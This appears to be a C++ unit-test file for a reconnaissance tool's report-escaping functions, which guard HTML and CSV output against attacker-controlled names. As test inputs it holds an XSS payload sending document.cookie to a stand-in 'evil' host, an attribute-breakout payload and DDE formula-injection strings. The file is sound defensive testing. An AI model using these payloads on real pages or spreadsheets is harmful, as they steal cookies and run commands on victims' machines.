#include <gtest/gtest.h>
#include <core/text_utils.h>

using namespace SysRecon::Core::Text;

// Report output is the tool's primary attack surface: every value below is
// attacker-controlled (registry Run value names, service display names,
// process names) and lands in a file an analyst is guaranteed to open.

TEST(HtmlEscape, NeutralisesScriptPayload) {
    const WString payload = L"<script>fetch('//evil/'+document.cookie)</script>";
    const WString escaped = HtmlEscape(payload);

    EXPECT_EQ(escaped.find(L"<script>"), WString::npos);
    EXPECT_EQ(escaped.find(L"</script>"), WString::npos);
    EXPECT_NE(escaped.find(L"&lt;script&gt;"), WString::npos);
}

TEST(HtmlEscape, EscapesAllFiveMetacharacters) {
    EXPECT_EQ(HtmlEscape(L"&"), L"&amp;");
    EXPECT_EQ(HtmlEscape(L"<"), L"&lt;");
    EXPECT_EQ(HtmlEscape(L">"), L"&gt;");
    EXPECT_EQ(HtmlEscape(L"\""), L"&quot;");
    EXPECT_EQ(HtmlEscape(L"'"), L"&#39;");
}

TEST(HtmlEscape, EscapesAmpersandFirstSoNoDoubleEncoding) {
    // "&lt;" must not become "&amp;lt;" -- ampersand handled in one pass.
    EXPECT_EQ(HtmlEscape(L"a&b<c"), L"a&amp;b&lt;c");
}

TEST(HtmlEscape, BreaksOutOfAttributeContext) {
    const WString payload = L"\" onmouseover=\"alert(1)";
    EXPECT_EQ(HtmlEscape(payload).find(L'"'), WString::npos);
}

TEST(HtmlEscape, LeavesBenignTextUntouched) {
    EXPECT_EQ(HtmlEscape(L"C:\\Windows\\System32\\svchost.exe"),
              L"C:\\Windows\\System32\\svchost.exe");
}

TEST(CsvEscape, DoublesEmbeddedQuotes) {
    // Service binary paths routinely look exactly like this.
    const WString path = L"\"C:\\Program Files\\X\\y.exe\" -k netsvcs";
    EXPECT_EQ(CsvEscape(path),
              L"\"\"\"C:\\Program Files\\X\\y.exe\"\" -k netsvcs\"");
}

TEST(CsvEscape, AlwaysWrapsInQuotes) {
    EXPECT_EQ(CsvEscape(L"plain"), L"\"plain\"");
}

TEST(CsvEscape, PreservesEmbeddedCommaWithinQuotes) {
    EXPECT_EQ(CsvEscape(L"a,b"), L"\"a,b\"");
}

TEST(FormulaInjection, DetectsAllDangerousLeadingCharacters) {
    EXPECT_TRUE(IsFormulaInjection(L"=cmd|'/c calc'!A1"));
    EXPECT_TRUE(IsFormulaInjection(L"+1+1"));
    EXPECT_TRUE(IsFormulaInjection(L"-1+1"));
    EXPECT_TRUE(IsFormulaInjection(L"@SUM(A1)"));
}

TEST(FormulaInjection, DetectsPayloadHiddenBehindLeadingWhitespace) {
    // Excel strips leading whitespace before deciding a cell is a formula.
    EXPECT_TRUE(IsFormulaInjection(L"   =cmd|'/c calc'!A1"));
    EXPECT_TRUE(IsFormulaInjection(L"\t=1+1"));
}

TEST(FormulaInjection, IgnoresOrdinaryText) {
    EXPECT_FALSE(IsFormulaInjection(L"svchost.exe"));
    EXPECT_FALSE(IsFormulaInjection(L""));
    EXPECT_FALSE(IsFormulaInjection(L"C:\\Windows"));
}

TEST(CsvEscape, PrefixesFormulaSoItCannotExecute) {
    // An attacker who can name a service must not be able to run code on the
    // analyst's machine when the report is opened.
    const WString escaped = CsvEscape(L"=cmd|'/c calc'!A1");
    EXPECT_EQ(escaped, L"\"'=cmd|'/c calc'!A1\"");
}

TEST(CsvEscape, HandlesFormulaAndQuoteTogether) {
    EXPECT_EQ(CsvEscape(L"=\"x\""), L"\"'=\"\"x\"\"\"");
}
